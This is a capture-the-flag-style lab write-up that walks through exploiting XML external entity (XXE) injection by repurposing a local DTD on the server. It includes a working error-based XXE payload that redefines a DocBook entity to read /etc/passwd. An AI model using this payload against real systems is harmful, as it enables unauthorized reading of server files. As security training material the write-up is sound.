### Lab: Exploiting XXE to retrieve data by repurposing a local DTD

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, trigger an error message containing the contents of the /etc/passwd file.

You'll need to reference an existing DTD file on the server and redefine an entity from it.

_____

Analysis and Exploit:

1. Intercet request to **/product/stock** and send it to **[BURP-REPEATER]**
```xml
<?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>1</productId>
        <storeId>1</storeId>
    </stockCheck>
```

2. Craft a payload to detect an existing DTD local to the web server
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % file SYSTEM 'file:///usr/share/yelp/dtd/docbookx.dtd'> %file;]>
    <stockCheck>
        <productId>1</productId>
        <storeId>1</storeId>
    </stockCheck>
```
    - returns no error, status code == 200: the dtd file exist
    - from the DTD schema from github [!]https://github.com/GNOME/yelp/blob/master/data/dtd/docbookx.dtd

```xml
<!ENTITY % ISOamso PUBLIC "ISO 8879:1986//ENTITIES Added Math Symbols: Ordinary//EN//XML" "isoamso.ent">

[...]

%ISOamso;
```

3. Craft a payload to redefine a local DTD entity and extract sestitive data from error messages
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

- if "root:x:0:0:root:/root:/bin/bash" in response text: exploit works!
